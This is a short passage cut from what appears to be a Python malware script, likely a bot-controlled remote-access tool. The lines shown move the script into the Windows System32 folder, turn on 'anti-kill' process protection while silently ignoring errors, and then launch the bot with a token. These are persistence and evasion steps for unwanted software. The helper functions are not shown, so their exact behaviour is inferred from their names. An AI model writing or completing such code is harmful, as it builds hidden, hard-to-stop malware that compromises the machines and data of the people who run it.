        new_path = move_to_sys32(script_path)
        if new_path:
            script_path = new_path
            
    # Enable anti-kill protection automatically
    try:
        protect_process()
        print("[+] Process protection enabled")
    except:
        pass
        
    # Start the bot
    bot.run(shine)
